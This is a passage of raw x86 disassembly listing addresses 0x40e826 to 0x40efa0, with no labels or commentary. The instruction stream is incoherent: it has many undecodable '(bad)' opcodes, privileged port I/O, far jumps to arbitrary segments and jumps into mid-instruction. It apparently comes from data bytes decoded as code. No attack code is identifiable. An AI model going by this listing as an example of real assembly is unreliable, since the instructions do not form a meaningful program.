  40e826:	aas    
  40e827:	and    DWORD PTR [eax-0x10a395c5],0x75
  40e82e:	pop    ds
  40e82f:	inc    edx
  40e830:	(bad)  
  40e831:	xor    BYTE PTR [esi-0x32c0eea8],bl
  40e837:	sbb    eax,0x6434d7ab
  40e83c:	int3   
  40e83d:	mov    al,0xad
  40e83f:	cmp    eax,0x169ccad7
  40e844:	xchg   ebp,eax
  40e845:	into   
  40e846:	and    DWORD PTR fs:[ecx],ebx
  40e849:	pushf  
  40e84a:	sub    bh,BYTE PTR [edx+0x79]
  40e84d:	cmp    BYTE PTR [esi-0x548044ed],ah
  40e853:	inc    eax
  40e854:	xor    eax,0x28933992
  40e859:	test   dl,dh
  40e85b:	jnp    0x40e8ac
  40e85d:	adc    BYTE PTR [ecx-0x2e23cfea],al
  40e863:	out    dx,al
  40e864:	lds    ebx,FWORD PTR [ebx]
  40e866:	cmp    DWORD PTR [ebp-0x22],0x7b
  40e86a:	cdq    
  40e86b:	mov    esi,DWORD PTR ds:0xf89e9fb
  40e871:	cmp    ecx,DWORD PTR [ecx+0x19]
  40e874:	mov    ecx,0x4ebed3d4
  40e879:	or     al,0xed
  40e87b:	push   esp
  40e87c:	and    al,0x5f
  40e87e:	mov    BYTE PTR [edi-0x7e04768a],dh
  40e884:	pop    ds
  40e885:	js     0x40e80c
  40e887:	dec    esp
  40e888:	push   0xffffff9d
  40e88a:	clc    
  40e88b:	fistp  DWORD PTR [ebx+0x4ac13479]
  40e891:	adc    al,0x31
  40e893:	mov    DWORD PTR [ebp+0x34ce0047],eax
  40e899:	mov    ds:0xdd3c2c91,al
  40e89e:	shl    BYTE PTR [eax-0x12922e5],cl
  40e8a4:	imul   edi,DWORD PTR [eax],0x9694d4cb
  40e8aa:	(bad)
  40e8ad:	dec    eax
  40e8ae:	loop   0x40e92c
  40e8b0:	jg     0x40e892
  40e8b2:	mov    bh,0xf8
  40e8b4:	call   0x9eced4e0
  40e8b9:	xchg   esp,eax
  40e8ba:	jo     0x40e90c
  40e8bc:	pop    es
  40e8bd:	js     0x40e91b
  40e8bf:	mov    esi,0x91bc4cd
  40e8c4:	fsub   st(5),st
  40e8c6:	mov    ebx,0x4da89603
  40e8cb:	jno    0x40e88a
  40e8cd:	repnz mov ds:0x11fe633b,al
  40e8d4:	test   eax,0xbb0bf0ff
  40e8d9:	or     dl,dl
  40e8db:	fs jle 0x40e8e0
  40e8de:	inc    edi
  40e8df:	shl    edi,0xc3
  40e8e2:	mov    ebp,0x6539b53a
  40e8e7:	je     0x40e916
  40e8e9:	shl    esp,0x4b
  40e8ec:	jp     0x40e8a8
  40e8ee:	jne    0x40e8ec
  40e8f0:	loop   0x40e954
  40e8f2:	leave  
  40e8f3:	fsubr  st,st(3)
  40e8f5:	out    dx,al
  40e8f6:	imul   edi,DWORD PTR [ebx+esi*8+0x5010b652],0xb4a403aa
  40e901:	loopne 0x40e93d
  40e903:	das    
  40e904:	in     eax,dx
  40e905:	clc    
  40e906:	stc    
  40e907:	xchg   ebx,eax
  40e908:	lds    edi,FWORD PTR [eax-0x6a]
  40e90b:	xor    DWORD PTR [ecx+0x5],esi
  40e90e:	add    BYTE PTR [ebx-0x3],ch
  40e911:	aam    0xdb
  40e913:	fs and al,0x80
  40e916:	xor    DWORD PTR [esi+0x3d],esp
  40e919:	mov    eax,ds:0x576743c1
  40e91e:	xlat   BYTE PTR ds:[ebx]
  40e91f:	sub    bh,BYTE PTR [eax-0x1]
  40e922:	popf   
  40e923:	fsubr  QWORD PTR [ebx+ecx*4+0x22]
  40e927:	inc    eax
  40e928:	add    eax,eax
  40e92a:	xchg   edx,eax
  40e92b:	adc    BYTE PTR [edi-0x5f5d4237],0xad
  40e932:	enter  0xbb4b,0x88
  40e936:	pop    ebx
  40e937:	adc    al,0xda
  40e939:	mov    fs,ebx
  40e93b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e93c:	pop    edx
  40e93d:	icebp  
  40e93e:	cld    
  40e93f:	popf   
  40e940:	stos   DWORD PTR es:[edi],eax
  40e941:	pop    edi
  40e942:	in     eax,dx
  40e943:	xchg   ecx,eax
  40e944:	xchg   edx,eax
  40e945:	test   eax,ecx
  40e947:	mov    ah,0x4a
  40e949:	scas   al,BYTE PTR es:[edi]
  40e94a:	xchg   edi,eax
  40e94b:	(bad)  
  40e94c:	imul   ecx,edi,0xffffffac
  40e94f:	out    0xda,al
  40e951:	popa   
  40e952:	out    0x19,eax
  40e954:	xor    eax,0x66
  40e957:	retf   
  40e958:	dec    DWORD PTR [esi+esi*1+0x21]
  40e95c:	stos   BYTE PTR es:[edi],al
  40e95d:	inc    eax
  40e95e:	and    eax,0xbaa32a7b
  40e963:	imul   esi,ebp,0xffffffdc
  40e966:	imul   eax,ecx,0xffffffad
  40e969:	outs   dx,DWORD PTR ds:[esi]
  40e96a:	repz iret 
  40e96c:	xor    DWORD PTR [esi-0x123fb6bd],eax
  40e972:	jp     0x40e97a
  40e974:	idiv   DWORD PTR [eax-0x77cf04da]
  40e97a:	and    eax,0xcd2637e8
  40e97f:	mov    al,0xa6
  40e981:	cli    
  40e982:	mov    BYTE PTR [edi-0x7e],ah
  40e985:	jb     0x40e990
  40e987:	mov    esi,0x958faa49
  40e98c:	mov    ah,0x2f
  40e98e:	cmp    al,0xcb
  40e990:	dec    esi
  40e991:	int    0x46
  40e993:	push   ds
  40e994:	hlt    
  40e995:	cmp    bh,0xe5
  40e998:	mov    edx,0x68dca645
  40e99d:	call   0x43fb:0x1737c1ba
  40e9a4:	sahf   
  40e9a5:	jecxz  0x40e981
  40e9a7:	xchg   esi,edx
  40e9a9:	xchg   ebp,eax
  40e9aa:	ret    
  40e9ab:	mov    ah,0x1b
  40e9ad:	xchg   ebp,eax
  40e9ae:	push   ebx
  40e9af:	inc    esp
  40e9b0:	scas   eax,DWORD PTR es:[edi]
  40e9b1:	ss or  bl,cl
  40e9b4:	push   0x65
  40e9b6:	sub    dh,BYTE PTR [ebx]
  40e9b8:	xor    cl,BYTE PTR [ebx+0x44]
  40e9bb:	rcr    BYTE PTR [eax],0x7d
  40e9be:	mov    eax,ds:0xf525b605
  40e9c3:	jmp    0xd14309bf
  40e9c8:	std    
  40e9c9:	enter  0xae6c,0x13
  40e9cd:	leave  
  40e9ce:	mov    ebx,0xcbecbf09
  40e9d3:	push   ebx
  40e9d4:	rol    DWORD PTR [ebp+0x48c86334],1
  40e9da:	pop    esp
  40e9db:	jns    0x40ea49
  40e9dd:	cdq    
  40e9de:	dec    esi
  40e9df:	retf   
  40e9e0:	or     esp,DWORD PTR [eax-0x9aad0bb]
  40e9e6:	aas    
  40e9e7:	les    eax,FWORD PTR ds:0x2fb0ce12
  40e9ed:	jecxz  0x40ea55
  40e9ef:	out    0xb3,al
  40e9f1:	fld    DWORD PTR ds:0xb914d116
  40e9f7:	sub    eax,0x82a487de
  40e9fc:	cld    
  40e9fd:	cmp    eax,0x5eed8a33
  40ea02:	jmp    0x40ea42
  40ea04:	cmp    al,0x11
  40ea06:	aaa    
  40ea07:	pop    edi
  40ea08:	lods   eax,DWORD PTR ds:[esi]
  40ea09:	xchg   ebx,eax
  40ea0a:	adc    DWORD PTR [edi+0x62],edx
  40ea0d:	push   cs
  40ea0e:	in     al,dx
  40ea0f:	cmp    eax,0x6673b0ba
  40ea14:	push   0x42
  40ea16:	xchg   edi,eax
  40ea17:	stc    
  40ea18:	and    DWORD PTR [esp+ecx*1],esi
  40ea1b:	(bad)  
  40ea1c:	pop    ss
  40ea1d:	xchg   edx,eax
  40ea1e:	call   0x2dbc:0xdbce5b40
  40ea25:	or     al,0xcc
  40ea27:	lock fimul DWORD PTR [ecx-0x1923ee70]
  40ea2e:	ins    DWORD PTR es:[edi],dx
  40ea2f:	xlat   BYTE PTR ds:[ebx]
  40ea30:	pop    ebp
  40ea31:	dec    edi
  40ea32:	rol    DWORD PTR gs:[esi],cl
  40ea35:	mov    ds:0xde28f3d6,eax
  40ea3a:	or     al,0x3c
  40ea3c:	adc    edi,0xfffffff1
  40ea3f:	sub    al,0x64
  40ea41:	sbb    DWORD PTR [ecx-0x6f54f178],edx
  40ea47:	(bad)  
  40ea48:	outs   dx,DWORD PTR ds:[esi]
  40ea49:	and    DWORD PTR [ebx],0xa8a7780a
  40ea4f:	mov    WORD PTR [edi+0x5b03646d],?
  40ea55:	cmp    ch,BYTE PTR [edx+0x51febffe]
  40ea5b:	retf   
  40ea5c:	or     ebp,esi
  40ea5e:	fs xchg esp,eax
  40ea60:	pop    edi
  40ea61:	les    esp,FWORD PTR [ebx]
  40ea63:	sub    al,BYTE PTR [edi+0xf]
  40ea66:	out    dx,al
  40ea67:	lds    esp,FWORD PTR [esi]
  40ea69:	pop    edi
  40ea6a:	jmp    0x40ea46
  40ea6c:	cmp    al,0xc1
  40ea6e:	jo     0x40eac9
  40ea70:	enter  0xb21a,0x77
  40ea74:	pop    ecx
  40ea75:	xchg   ecx,eax
  40ea76:	cld    
  40ea77:	adc    eax,edi
  40ea79:	add    BYTE PTR [ecx-0x2d],cl
  40ea7c:	jge    0x40ea0b
  40ea7e:	sub    ecx,DWORD PTR [esi+0x60]
  40ea81:	xor    BYTE PTR [eax+esi*2-0x584c3016],0x79
  40ea89:	push   es
  40ea8a:	sub    BYTE PTR [ebx+0x5754af08],bl
  40ea90:	pop    es
  40ea91:	mov    ah,0xa
  40ea93:	mov    dl,0x50
  40ea95:	xchg   ebp,eax
  40ea96:	sub    ecx,ebp
  40ea98:	cmp    BYTE PTR [eax-0x173915c8],dh
  40ea9e:	jmp    0x40eaf3
  40eaa0:	aad    0x7e
  40eaa2:	cmp    DWORD PTR [edx-0x13976d2],ebp
  40eaa8:	js     0x40eae0
  40eaaa:	bound  esi,QWORD PTR [edi]
  40eaac:	jmp    0xfe62:0x3d9cd2ae
  40eab3:	adc    eax,0x37cb5315
  40eab8:	enter  0x151b,0x38
  40eabc:	pop    ecx
  40eabd:	sub    al,0x97
  40eabf:	in     al,dx
  40eac0:	test   eax,0x2017f1fd
  40eac5:	int3   
  40eac6:	std    
  40eac7:	ficomp WORD PTR [esp+0x3a]
  40eacb:	pushf  
  40eacc:	pop    esp
  40eacd:	out    dx,eax
  40eace:	push   eax
  40eacf:	test   BYTE PTR [edi],dh
  40ead1:	enter  0xd944,0x79
  40ead5:	arpl   WORD PTR [eax-0x2b4ea7ff],ax
  40eadb:	sti    
  40eadc:	aam    0x7a
  40eade:	mov    ch,0xed
  40eae0:	inc    ebx
  40eae1:	mov    al,0xb4
  40eae3:	adc    BYTE PTR [edi],dl
  40eae5:	xor    DWORD PTR [ebp-0x11],esi
  40eae8:	jle    0x40ead8
  40eaea:	xchg   BYTE PTR [ebx],ah
  40eaec:	lock inc eax
  40eaee:	push   0xffffffd5
  40eaf0:	mov    ebx,0x31b44f44
  40eaf5:	cli    
  40eaf6:	outs   dx,DWORD PTR ds:[esi]
  40eaf7:	jno    0x40eb66
  40eaf9:	outs   dx,DWORD PTR ds:[esi]
  40eafa:	bound  esp,QWORD PTR [edi+0x6b956fdf]
  40eb00:	(bad)  
  40eb01:	add    DWORD PTR [ecx+eax*4+0x4dbc4042],esp
  40eb08:	pop    eax
  40eb09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eb0a:	ret    0x6213
  40eb0d:	jo     0x40eaab
  40eb0f:	push   esp
  40eb10:	pop    ebx
  40eb11:	mov    eax,ds:0x43947ba2
  40eb16:	out    dx,al
  40eb17:	jle    0x40eab2
  40eb19:	(bad)  
  40eb1a:	enter  0xebe5,0x65
  40eb1e:	push   cs
  40eb1f:	jg     0x40eb79
  40eb21:	dec    eax
  40eb22:	and    DWORD PTR [edx-0x33],ebx
  40eb25:	jb     0x40eb9a
  40eb27:	fsincos 
  40eb29:	mov    al,fs:0xebcfa9a0
  40eb2f:	push   ebx
  40eb30:	test   al,0xbd
  40eb32:	and    ch,bh
  40eb34:	in     eax,0x8e
  40eb36:	add    DWORD PTR [edi+0x72253993],edi
  40eb3c:	imul   esi,DWORD PTR [ebp+0x659ecdd8],0xffffff8c
  40eb43:	sub    al,0x8d
  40eb45:	aaa    
  40eb46:	sub    DWORD PTR [ecx-0x5e73e972],esi
  40eb4c:	jmp    0x14e3779e
  40eb51:	dec    ebx
  40eb52:	adc    al,0xf2
  40eb54:	xor    al,0xea
  40eb56:	cmp    eax,0x250265ce
  40eb5b:	and    DWORD PTR [edx],esi
  40eb5d:	pop    ss
  40eb5e:	xchg   edi,eax
  40eb5f:	add    ax,0x7098
  40eb63:	adc    dh,BYTE PTR [esi+0x5]
  40eb66:	dec    edx
  40eb67:	mov    ds:0xcb4858d5,eax
  40eb6c:	sub    DWORD PTR [esp+ebp*1],0x59318f46
  40eb73:	pushf  
  40eb74:	lea    ecx,[ebx-0xb0d1813]
  40eb7a:	test   eax,0x15944400
  40eb7f:	xchg   edi,edi
  40eb81:	loopne 0x40eb1f
  40eb83:	pop    ebx
  40eb84:	pop    edx
  40eb85:	loopne 0x40ebc5
  40eb87:	or     DWORD PTR [eax-0x73],ecx
  40eb8a:	add    ch,bh
  40eb8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eb8d:	into   
  40eb8e:	cmp    eax,0x86587f73
  40eb93:	(bad)  
  40eb94:	icebp  
  40eb95:	xchg   ebx,eax
  40eb96:	sub    bh,al
  40eb98:	jae    0x40eb39
  40eb9a:	mov    WORD PTR [esi+edx*8+0x1fc4fd60],ss
  40eba1:	daa    
  40eba2:	neg    DWORD PTR [eax]
  40eba4:	pop    ss
  40eba5:	mov    dh,0x42
  40eba7:	or     al,BYTE PTR [eax]
  40eba9:	mul    DWORD PTR [edx]
  40ebab:	out    0x9e,al
  40ebad:	retf   0x8609
  40ebb0:	std    
  40ebb1:	fs add eax,0xd839c503
  40ebb7:	add    ecx,DWORD PTR [ebx+0x5c1defaf]
  40ebbd:	dec    ecx
  40ebbe:	push   edx
  40ebbf:	nop
  40ebc0:	iret   
  40ebc1:	test   BYTE PTR [esi+ebx*8+0x77a6b480],cl
  40ebc8:	das    
  40ebc9:	push   ds
  40ebca:	sbb    eax,0xef8de7fe
  40ebcf:	push   es
  40ebd0:	nop
  40ebd1:	xchg   esp,eax
  40ebd2:	jmp    0x6d8:0xda87f610
  40ebd9:	mov    cl,ch
  40ebdb:	cli    
  40ebdc:	outs   dx,BYTE PTR ds:[esi]
  40ebdd:	je     0x40ec04
  40ebdf:	aam    0x76
  40ebe1:	jb     0x40eb8c
  40ebe3:	mul    BYTE PTR [edx+0x18121a05]
  40ebe9:	cs pop edi
  40ebeb:	mov    dh,0x44
  40ebed:	jmp    0xee6ad29f
  40ebf2:	ins    DWORD PTR es:[edi],dx
  40ebf3:	mov    ds:0x3a6b464e,al
  40ebf8:	inc    ebx
  40ebf9:	retf   0xf8ee
  40ebfc:	cld    
  40ebfd:	es push cs
  40ebff:	xor    DWORD PTR [eax+0x6c],eax
  40ec02:	popf   
  40ec03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec04:	dec    edi
  40ec05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec06:	pop    edx
  40ec07:	or     DWORD PTR [edi-0x3a554f98],esp
  40ec0d:	xor    al,0x72
  40ec0f:	daa    
  40ec10:	(bad)  
  40ec11:	loopne 0x40ebee
  40ec13:	sbb    ah,al
  40ec15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec16:	icebp  
  40ec17:	and    DWORD PTR [esi],edx
  40ec19:	sbb    dl,BYTE PTR [ebx-0x6581fbbd]
  40ec1f:	xchg   DWORD PTR [ebp+0x467a6871],edi
  40ec25:	out    dx,eax
  40ec26:	xor    ch,0xe7
  40ec29:	div    DWORD PTR [ecx+0x24]
  40ec2c:	ins    DWORD PTR es:[edi],dx
  40ec2d:	mov    dh,0x75
  40ec2f:	hlt    
  40ec30:	rol    BYTE PTR [ecx+ebx*4],1
  40ec33:	or     ax,0xa5c4
  40ec37:	retf   
  40ec38:	ins    DWORD PTR es:[edi],dx
  40ec39:	mov    bh,ch
  40ec3b:	call   0x112047ca
  40ec40:	mov    ecx,0xc6654684
  40ec45:	mov    ebp,0x996cf308
  40ec4a:	jb     0x40ec7c
  40ec4c:	xor    ah,BYTE PTR [edx]
  40ec4e:	out    0x60,al
  40ec50:	mov    WORD PTR [eax-0x6fb682c4],gs
  40ec56:	test   eax,0x7a5800b1
  40ec5b:	dec    esi
  40ec5c:	in     al,dx
  40ec5d:	pop    edi
  40ec5e:	and    al,0x87
  40ec60:	(bad)  
  40ec62:	mov    fs,WORD PTR [esp+ecx*8+0x53]
  40ec66:	dec    esi
  40ec67:	pop    es
  40ec68:	push   eax
  40ec69:	ds jg  0x40ec1d
  40ec6c:	out    0x70,al
  40ec6e:	cmp    eax,eax
  40ec70:	xchg   BYTE PTR gs:[edi+0x57d05283],ch
  40ec77:	jns    0x40ec7e
  40ec79:	(bad)  
  40ec7a:	repz ret 0x5b3b
  40ec7e:	and    BYTE PTR ds:0xa0a68c73,bh
  40ec84:	int    0xb3
  40ec86:	dec    ebp
  40ec87:	pop    eax
  40ec88:	test   al,0x9d
  40ec8a:	ds mov ecx,0x73032648
  40ec90:	inc    ecx
  40ec91:	repz mov fs,WORD PTR [eax]
  40ec94:	or     cl,BYTE PTR [eax+0x563a1b65]
  40ec9a:	test   eax,0xe7e31e3e
  40ec9f:	fild   QWORD PTR [esi-0x1525331d]
  40eca5:	push   ds
  40eca6:	add    al,0xb8
  40eca8:	adc    esp,0x18
  40ecab:	push   ds
  40ecac:	adc    eax,0xca3fdda0
  40ecb1:	add    edx,DWORD PTR [ebp+0x71]
  40ecb4:	retf   
  40ecb5:	addr16 icebp 
  40ecb7:	inc    ecx
  40ecb8:	ret    0x59d6
  40ecbb:	leave  
  40ecbc:	fmul   DWORD PTR [ecx]
  40ecbe:	sbb    DWORD PTR cs:[eax+0x6cf1c03a],esi
  40ecc5:	jle    0x40ec92
  40ecc7:	mov    ebp,0x74bd4999
  40eccc:	mov    dl,0xb
  40ecce:	das    
  40eccf:	rcl    edi,1
  40ecd1:	mov    eax,0x2fb41cd7
  40ecd6:	jne    0x40ed14
  40ecd8:	jo     0x40ed42
  40ecda:	(bad)  
  40ecdb:	stc    
  40ecdc:	out    dx,eax
  40ecdd:	aam    0x2d
  40ecdf:	je     0x40ec89
  40ece1:	jb     0x40ecf4
  40ece3:	or     al,BYTE PTR [ebx-0x3559c37c]
  40ece9:	popf   
  40ecea:	cmp    eax,0xc3984e5b
  40ecef:	mov    eax,DWORD PTR [esi-0x6c49c21]
  40ecf5:	xor    BYTE PTR [edi+0x5f],ah
  40ecf8:	sub    ebx,DWORD PTR [esi]
  40ecfa:	adc    eax,0x5b3705ca
  40ecff:	jno    0x40ecfd
  40ed01:	dec    esp
  40ed02:	pop    edi
  40ed03:	ss push 0xffffff83
  40ed06:	sbb    cl,BYTE PTR [ecx-0x22eb4284]
  40ed0c:	xor    ah,bh
  40ed0e:	mov    eax,ds:0xefde616c
  40ed13:	dec    eax
  40ed14:	xchg   esi,eax
  40ed15:	loop   0x40ed8a
  40ed17:	adc    cl,BYTE PTR [edi-0x5e]
  40ed1a:	mov    bl,0x4
  40ed1c:	dec    ebp
  40ed1d:	shl    bl,0xc
  40ed20:	pop    eax
  40ed21:	push   es
  40ed22:	mov    ah,0xaf
  40ed24:	lea    ebp,[esi-0xdce7bee]
  40ed2a:	push   edx
  40ed2b:	mov    ebx,0x3a6b05ee
  40ed30:	repnz adc dl,bl
  40ed33:	xchg   DWORD PTR [ebp+ebp*8+0x295f3b3b],eax
  40ed3a:	clc    
  40ed3b:	push   0x67883067
  40ed40:	(bad)  
  40ed41:	in     al,dx
  40ed42:	rol    BYTE PTR [edx],1
  40ed44:	xor    al,0xb7
  40ed46:	mov    cl,0x6
  40ed48:	pop    ebp
  40ed49:	fst    DWORD PTR [ebp+0x45]
  40ed4c:	jmp    0x40ed40
  40ed4e:	enter  0xf4cf,0x48
  40ed52:	fs jecxz 0x40edb3
  40ed55:	cdq    
  40ed56:	adc    al,0xb1
  40ed58:	mov    ds:0xc65761e2,eax
  40ed5d:	sti    
  40ed5e:	add    BYTE PTR [ecx],dh
  40ed60:	xchg   edx,eax
  40ed61:	mov    bl,0xee
  40ed63:	adc    al,0xb6
  40ed65:	dec    eax
  40ed66:	mov    esp,0x16db17d4
  40ed6b:	pop    gs
  40ed6d:	pop    edi
  40ed6e:	adc    bl,bl
  40ed70:	daa    
  40ed71:	(bad)  
  40ed72:	mov    edx,0xca7293d0
  40ed77:	xor    ebx,DWORD PTR [esi-0x37]
  40ed7a:	add    DWORD PTR [eax+0x37],0x16
  40ed7e:	sar    ch,0x12
  40ed81:	ficom  DWORD PTR [ebx+0x4c423156]
  40ed87:	xchg   edi,eax
  40ed88:	sub    DWORD PTR [edx-0x24],0xcb93318e
  40ed8f:	ds je  0x40ed7e
  40ed92:	adc    bh,dh
  40ed94:	sub    esp,edx
  40ed96:	mov    edx,DWORD PTR [ebp+0x3eb57a0a]
  40ed9c:	sbb    DWORD PTR [ebp+0x10],edx
  40ed9f:	fs fdiv st,st(3)
  40eda2:	jae    0x40edaf
  40eda4:	dec    ebx
  40eda5:	dec    edx
  40eda6:	popa   
  40eda7:	sub    ah,BYTE PTR [ebp+0x0]
  40edaa:	xor    bh,ch
  40edac:	or     esp,DWORD PTR [edx+0x78]
  40edaf:	lds    edx,FWORD PTR [edx]
  40edb1:	shl    DWORD PTR ds:0x587bb94c,0x91
  40edb8:	or     eax,0xa4a82c93
  40edbd:	cli    
  40edbe:	in     eax,dx
  40edbf:	(bad)  
  40edc0:	xlat   BYTE PTR ds:[ebx]
  40edc1:	(bad)  
  40edc2:	dec    eax
  40edc3:	sub    ecx,esp
  40edc5:	and    esi,DWORD PTR [esi-0xf]
  40edc8:	xchg   edx,eax
  40edc9:	or     edi,DWORD PTR [ebx+0x35]
  40edcc:	push   eax
  40edcd:	push   es
  40edce:	or     al,ah
  40edd0:	out    0xc6,al
  40edd2:	mov    bl,0xbe
  40edd4:	aad    0xd6
  40edd6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40edd7:	cmp    DWORD PTR [edx+0x15a1a550],ecx
  40eddd:	ins    DWORD PTR es:[edi],dx
  40edde:	(bad)  
  40eddf:	out    dx,al
  40ede0:	or     al,0x18
  40ede2:	inc    ebp
  40ede3:	dec    eax
  40ede4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ede5:	leave  
  40ede6:	xor    DWORD PTR [edi-0x6a],eax
  40ede9:	mov    ebx,0x18cf19c4
  40edee:	inc    edi
  40edef:	xor    BYTE PTR [ecx+eiz*2],ch
  40edf2:	rol    DWORD PTR [esi],cl
  40edf4:	mov    ds:0x31dcb9b8,al
  40edf9:	stos   DWORD PTR es:[edi],eax
  40edfa:	and    al,0x43
  40edfd:	xchg   ebp,eax
  40edfe:	jo     0x40edd8
  40ee00:	inc    edx
  40ee01:	mov    ebx,0xbb4d2e73
  40ee06:	pop    esp
  40ee07:	xor    al,0x18
  40ee09:	push   0x4b
  40ee0b:	push   esp
  40ee0c:	inc    esp
  40ee0d:	or     esi,DWORD PTR [edi-0x766d69ca]
  40ee13:	lods   eax,DWORD PTR ds:[esi]
  40ee14:	mov    esp,0x9d6cd77c
  40ee19:	dec    ebx
  40ee1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ee1b:	cld    
  40ee1c:	test   al,0x21
  40ee1e:	or     dh,BYTE PTR [eax+0x3167d98a]
  40ee24:	int    0xaa
  40ee26:	ds jae 0x40ee02
  40ee29:	xor    bh,dl
  40ee2b:	jp     0x40ee48
  40ee2d:	lods   al,BYTE PTR ds:[esi]
  40ee2e:	mov    eax,ds:0x298fb3c0
  40ee33:	mov    cl,0xe7
  40ee35:	mov    bh,0xe4
  40ee37:	push   0x11bd2b14
  40ee3c:	nop
  40ee3d:	dec    ebp
  40ee3e:	add    al,0x41
  40ee40:	cld    
  40ee41:	xor    DWORD PTR [ebx+edi*8+0x52],edx
  40ee45:	lds    esp,FWORD PTR [esi+0x5e]
  40ee48:	arpl   cx,sp
  40ee4a:	lods   eax,DWORD PTR ds:[esi]
  40ee4b:	mov    al,ds:0x2bb29a61
  40ee50:	test   eax,0x7956a416
  40ee55:	retf   0xe961
  40ee58:	inc    ebx
  40ee59:	cdq    
  40ee5a:	cdq    
  40ee5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ee5c:	in     al,0x5f
  40ee5e:	jb     0x40ee67
  40ee60:	push   ecx
  40ee61:	xlat   BYTE PTR ds:[ebx]
  40ee62:	inc    edx
  40ee63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ee64:	fsubr  QWORD PTR [ecx+0x32]
  40ee67:	jmp    0xd054:0x12b191a5
  40ee6e:	sub    eax,0xac76e2ad
  40ee73:	sar    BYTE PTR [ebx],cl
  40ee75:	adc    ch,cl
  40ee77:	adc    eax,0xd8a32c91
  40ee7c:	fdivr  QWORD PTR [esi-0x66]
  40ee7f:	adc    cl,cl
  40ee81:	fcomp  QWORD PTR [eax-0x33774edb]
  40ee87:	lods   al,BYTE PTR ds:[esi]
  40ee88:	pop    ebp
  40ee89:	mov    esp,ecx
  40ee8b:	sub    DWORD PTR [ecx+edx*4+0x527960a7],ebp
  40ee92:	into   
  40ee93:	jp     0x40ee41
  40ee95:	mov    ebx,0x5d75406a
  40ee9a:	jmp    0x4b83:0x52113772
  40eea1:	jbe    0x40eef5
  40eea3:	push   ebx
  40eea4:	add    BYTE PTR [edi],ch
  40eea6:	ins    BYTE PTR es:[edi],dx
  40eea7:	sub    esi,DWORD PTR [ecx+0x76]
  40eeaa:	pop    ds
  40eeab:	mov    ebp,0x2541d3b2
  40eeb0:	popf   
  40eeb1:	xchg   edx,eax
  40eeb2:	push   ebx
  40eeb3:	retf   
  40eeb4:	lock sar DWORD PTR [ebx-0x388e8bbf],1
  40eebb:	out    0x91,al
  40eebd:	rcl    esi,0x3
  40eec0:	fdivr  DWORD PTR [ecx+ecx*8+0x5f]
  40eec4:	popa   
  40eec5:	pushw  cs
  40eec7:	sbb    BYTE PTR [edx-0x1b02f3d3],bh
  40eecd:	repz jmp 0xbb2bebc5
  40eed3:	jle    0x40ee9a
  40eed5:	adc    al,0xe9
  40eed7:	pushf  
  40eed8:	test   eax,0x78871b36
  40eedd:	pop    ebp
  40eede:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eedf:	adc    al,0x60
  40eee1:	push   ebp
  40eee2:	repnz mov es,WORD PTR [ebx-0x27]
  40eee6:	pushf  
  40eee7:	inc    ebp
  40eee8:	and    al,0xc5
  40eeea:	pop    es
  40eeeb:	cmc    
  40eeec:	cmp    dh,bl
  40eeee:	test   BYTE PTR [ebp+ebp*4-0x773d93d3],0x82
  40eef6:	xor    DWORD PTR ds:0xc0b8d958,eax
  40eefc:	sbb    BYTE PTR [ecx-0x59],cl
  40eeff:	push   ds
  40ef00:	inc    esi
  40ef01:	aas    
  40ef02:	mov    ebp,DWORD PTR [esi]
  40ef04:	retf   
  40ef05:	(bad)  
  40ef07:	jns    0x40eef4
  40ef09:	and    ecx,DWORD PTR gs:[edi+0x74]
  40ef0d:	bound  edi,QWORD PTR [ecx]
  40ef0f:	add    DWORD PTR [esi+0x77],esp
  40ef12:	ror    BYTE PTR [edi+0x55a59fee],cl
  40ef18:	shl    DWORD PTR [eax+esi*2+0x25],1
  40ef1c:	ret    
  40ef1d:	xor    ah,dh
  40ef1f:	aaa    
  40ef20:	gs or  eax,0xa3e858e0
  40ef26:	imul   edi,DWORD PTR [edi+0x6a],0x4a5f1d4c
  40ef2d:	enter  0xcf0a,0x90
  40ef31:	int    0x18
  40ef33:	fisttp DWORD PTR [edi-0x6b424df]
  40ef39:	js     0x40ef7d
  40ef3b:	scas   al,BYTE PTR es:[edi]
  40ef3c:	mov    al,ds:0x35a0fed5
  40ef41:	jae    0x40ef65
  40ef43:	mov    ds:0xfd9f2636,eax
  40ef48:	and    DWORD PTR [ebp-0x45],0x96edc48c
  40ef4f:	mov    esi,0x388357ef
  40ef54:	scas   eax,DWORD PTR es:[edi]
  40ef55:	(bad)  
  40ef56:	call   0x955ea03b
  40ef5b:	pop    eax
  40ef5c:	ins    DWORD PTR es:[edi],dx
  40ef5d:	das    
  40ef5e:	popf   
  40ef5f:	imul   esp,DWORD PTR [esi],0xffffffa0
  40ef62:	pop    ebx
  40ef63:	lock mov dl,0x33
  40ef66:	lods   al,BYTE PTR ds:[esi]
  40ef67:	or     BYTE PTR [ebx+0x46],dl
  40ef6a:	cwde   
  40ef6b:	and    edi,DWORD PTR [ebx+0x73]
  40ef6e:	je     0x40efe4
  40ef70:	jno    0x40ef82
  40ef72:	das    
  40ef73:	je     0x40ef7a
  40ef75:	fs xor eax,0x19b3d261
  40ef7b:	(bad)  
  40ef7c:	daa    
  40ef7d:	fimul  DWORD PTR [esi]
  40ef7f:	inc    edx
  40ef80:	sub    BYTE PTR [esi-0x2],0x9c
  40ef84:	bound  edi,QWORD PTR [ebp-0x40]
  40ef87:	lock scas eax,DWORD PTR es:[edi]
  40ef89:	sbb    BYTE PTR [ecx],bl
  40ef8b:	aad    0xe2
  40ef8d:	daa    
  40ef8e:	ds lahf 
  40ef90:	xchg   ecx,eax
  40ef91:	in     eax,dx
  40ef92:	in     eax,dx
  40ef93:	arpl   WORD PTR [eax-0x73],bp
  40ef96:	cmp    dl,BYTE PTR [esi+0x14e62669]
  40ef9c:	push   es
  40ef9d:	retf   
  40ef9e:	out    0x11,eax
  40efa0:	adc    BYTE PTR [ecx+eax*8],dh
